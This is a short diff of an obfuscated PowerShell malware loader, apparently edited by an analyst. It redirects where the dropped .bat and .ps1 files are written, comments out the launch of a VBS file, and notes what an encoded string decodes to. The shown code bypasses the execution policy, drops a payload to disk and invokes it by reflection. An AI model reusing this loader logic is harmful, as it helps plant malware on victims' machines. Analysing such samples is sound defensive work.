@@ -26,7 +26,7 @@ if (-not (Test-Path  $OutPath ))
 $Content = @'
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\Users\Public\5551215456.ps1'"
 '@
-Set-Content -Path C:\Users\Public\5551215456.bat -Value $Content
+Set-Content -Path C:\5551215456.bat -Value $Content
 # create file 5551215456.bat with the content
 # this file will edit ExecutionPolicy
 
@@ -136,10 +136,10 @@ elseif(  $X37ot::Exists($Framework2)){
 $a.'GetType'('order.yes').'GetMethod'('Execute').'Invoke'($null,[object[]] ($Framework2,$FiLc))
 }
 '@
-Set-Content -Path C:\Users\Public\5551215456.ps1 -Value $YBONHVKEUXLLHAJGIKODTL
+Set-Content -Path C:\Code.ps1 -Value $YBONHVKEUXLLHAJGIKODTL
 
-start-sleep -s 10
-Start "C:\ProgramData\WindowsHost\5551215456.vbs"
+# start-sleep -s 10
+# Start "C:\ProgramData\WindowsHost\5551215456.vbs"
 
 # ! Above string decodes:
 # $w = [Reflection.Assembly]
